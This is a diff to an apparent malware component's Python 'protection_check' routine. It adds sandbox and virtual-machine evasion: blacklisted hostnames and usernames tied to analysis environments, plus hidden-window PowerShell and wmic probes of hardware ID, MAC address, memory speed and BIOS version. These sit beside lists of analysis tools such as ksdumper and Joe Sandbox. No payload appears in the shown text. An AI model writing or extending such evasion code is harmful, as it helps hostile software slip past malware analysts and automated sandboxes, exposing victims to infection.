@@ -4,7 +4,6 @@ import psutil
 import subprocess
 import socket
 import requests
-import sys
 
 def protection_check():
     try: 
@@ -49,7 +48,6 @@ def protection_check():
         'ksdumper.exe', 
         'joeboxserver.exe', 
     ]
-
     blacklisted_hwids = [
         "7AB5C494-39F5-4941-9163-47F54D6D5016",
         "03DE0294-0480-05DE-1A06-350700080009",
@@ -269,20 +267,53 @@ def protection_check():
             "ea:f6:f1:a2:33:76",
             "f6:a5:41:31:b2:78",
         ]
+    blacklisted_hostnames = [
+        "AppOnFly-VPS",
+        "vboxuser",
+        "ARCHIBALDPC",
+        "6C4E733F-C2D9-4"
+    ]
+    blacklisted_usernames = [
+        "WDAGUtilityAccount",
+        "vboxuser"
+    ]
+
+
     try:
         my_mac = str(getmac.get_mac_address())
         if my_mac in blacklisted_macs:
             return True
-    except:
-        pass
+    except: pass
 
     try:
         my_hwid = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
-
         if my_hwid in blacklisted_hwids:
             return True
-    except:
-        pass
+    except: pass
+
+    try:
+        hostname = socket.gethostname()
+        if hostname in blacklisted_hostnames:
+            return True
+    except: pass
+
+    try:
+        username = os.getlogin()
+        if username in blacklisted_usernames:
+            return True
+    except: pass
+
+    try: #? may be removed in the future
+        speedcheck = subprocess.check_output('wmic MemoryChip get /format:list | find /i "Speed"', creationflags=subprocess.CREATE_NO_WINDOW, shell=True).decode().strip()
+        if "Speed=0" in str(speedcheck):
+            return True
+    except: pass
+
+    try:
+        bioscheck = subprocess.check_output("wmic bios get smbiosbiosversion", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
+        if "Hyper-V" in str(bioscheck): 
+            return True
+    except: pass
         
     for process in psutil.process_iter(['pid', 'name']):
         if process.info['name'].lower() in blacklisted_processes:
@@ -294,7 +325,6 @@ def protection_check():
     return False
 
 web_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
 def single_instance_lock():
     try:
         web_socket.bind(('localhost', 12344))
